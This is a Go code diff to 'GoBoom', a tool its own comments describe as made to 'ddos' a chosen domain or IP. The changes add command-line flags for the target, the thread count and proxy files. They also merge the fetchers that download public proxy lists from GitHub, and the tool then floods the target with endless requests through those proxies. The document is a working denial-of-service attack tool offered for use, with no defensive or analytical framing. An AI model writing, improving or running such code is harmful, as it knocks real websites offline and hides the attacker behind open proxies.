@@ -9,9 +9,12 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/akamensky/argparse"
 )
 
 var statusCodeToEscape = []string{
@@ -31,49 +34,10 @@ var statusCodeToEscape = []string{
 	"405 Method Not Allowed",
 }
 
-func getProxyList_github() []string {
-	//get the list of proxy at https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt
+func getProxyList_github(link string) []string {
 	//format of the list is ip:port
 	//return a list of proxy
-	resp, err := http.Get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt")
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer resp.Body.Close()
-	//read the body of the response
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	proxy_list := strings.Replace(string(body), "\r", "", -1)
-	return strings.Split(proxy_list, "\n")
-}
-
-func getProxyList_github2() []string {
-	//get the list of proxy at https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt
-	//format of the list is ip:port
-	//return a list of proxy
-	resp, err := http.Get("https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt")
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer resp.Body.Close()
-	//read the body of the response
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	proxy_list := strings.Replace(string(body), "\r", "", -1)
-	return strings.Split(proxy_list, "\n")
-}
-
-func getProxyList_github3() []string {
-	//get the list of proxy at https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt
-	//format of the list is ip:port
-	//return a list of proxy
-	resp, err := http.Get("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt")
+	resp, err := http.Get(link)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -141,6 +105,24 @@ func getProxyList_genode() []string {
 		proxy_list = append(proxy_list, proxy.IP+":"+proxy.Port)
 	}
 	return proxy_list
+}
+
+func getProxyList_file(path string) []string {
+	//format of the list is ip:port
+	//return a list of proxy
+	file, err := os.Open(path)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer file.Close()
+	//read the body of the response
+	body, err := ioutil.ReadAll(file)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	proxy_list := strings.Replace(string(body), "\r", "", -1)
+	return strings.Split(proxy_list, "\n")
 }
 
 func chunkSlice(s []string, total_to_divided int) [][]string {
@@ -239,13 +221,21 @@ func check_host_up(domain string) bool {
 	return true
 }
 
-func test_proxy() []string {
+func test_proxy(proxy_file []string) []string {
 	var good_proxy []string
 	//get the list of proxy
 	proxy_list := getProxyList_genode()
-	proxy_list = append(proxy_list, getProxyList_github()...)
-	proxy_list = append(proxy_list, getProxyList_github2()...)
-	proxy_list = append(proxy_list, getProxyList_github3()...)
+	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt")...)
+	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt")...)
+	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt")...)
+	proxy_list = append(proxy_list, getProxyList_github("https://github.com/monosans/proxy-list/blob/main/proxies/http.txt")...)
+
+	if len(proxy_file) > 0 {
+		for _, file := range proxy_file {
+			proxy_list = append(proxy_list, getProxyList_file(file)...)
+		}
+	}
+
 	//remove duplicate
 	proxy_list = removeDuplicates(proxy_list)
 	fmt.Println("Total proxy : ", len(proxy_list))
@@ -274,27 +264,48 @@ func test_proxy() []string {
 }
 
 func main() {
-	//get the list of proxy
-	proxy_list := test_proxy()
-	fmt.Println("Total proxy :", len(proxy_list))
-	//ask for the domain or ip to ddos
-	fmt.Println("Enter the domain or ip to ddos")
-	var domain string
-	fmt.Scanln(&domain)
-	if !check_host_up(domain) {
+	parser := argparse.NewParser("GoBoom", "Boom some website by proxy")
+	domain := parser.String("d", "domain", &argparse.Options{Required: true, Help: "Domain to boom"})
+	threads := parser.String("t", "threads", &argparse.Options{Required: false, Help: "Number of threads", Default: "max"})
+	proxy_file := parser.StringList("p", "proxy-file", &argparse.Options{Required: false, Help: "Proxy file(s), separate with a ',' each files. Format of file(s) must be ip:port", Default: []string{}})
+	err := parser.Parse(os.Args)
+	if err != nil {
+		fmt.Print(parser.Usage(err))
+		os.Exit(1)
+	}
+	if !check_host_up(*domain) {
 		fmt.Println("The domain or ip is not up")
 		os.Exit(1)
 	}
-	//ask for the number of threads
-	fmt.Println("Enter the number of threads (max are number of proxy : ", len(proxy_list), ")")
-	var threads int
-	fmt.Scanln(&threads)
-	if threads > len(proxy_list) || threads < 1 {
-		threads = len(proxy_list)
+	for _, p := range *proxy_file {
+		//split all the files by comma
+		if strings.Contains(p, ",") {
+			*proxy_file = strings.Split(p, ",")
+		} else {
+			*proxy_file = append(*proxy_file, p)
+		}
+	}
+	proxy_list := test_proxy(*proxy_file)
+
+	//get the list of proxy
+	fmt.Println("Total proxy :", len(proxy_list))
+	threads_int := 10
+
+	if *threads != "max" {
+		threads_int, err = strconv.Atoi(*threads)
+		if err != nil {
+			fmt.Println("Error : threads must be a number")
+			os.Exit(1)
+		}
+	} else {
+		threads_int = len(proxy_list)
+	}
+	if threads_int > len(proxy_list) {
+		threads_int = len(proxy_list)
 		fmt.Println("Apply max threads")
 	}
 	//chunk the proxy list
-	chunked_proxy_list := chunkSlice(proxy_list, threads)
+	chunked_proxy_list := chunkSlice(proxy_list, threads_int)
 	//start the threads
 	//create a channel list of good proxy
 	for {
@@ -306,9 +317,9 @@ func main() {
 				for _, proxy := range chunk {
 					for {
 						//time.Sleep(time.Millisecond * 100)
-						status := handlerProxy(domain, proxy)
+						status := handlerProxy(*domain, proxy)
 						if status != "error" {
-							fmt.Println(status)
+							fmt.Println(status, "time :", time.Now().Format("15:04:05.000"))
 							continue
 						} else {
 							break
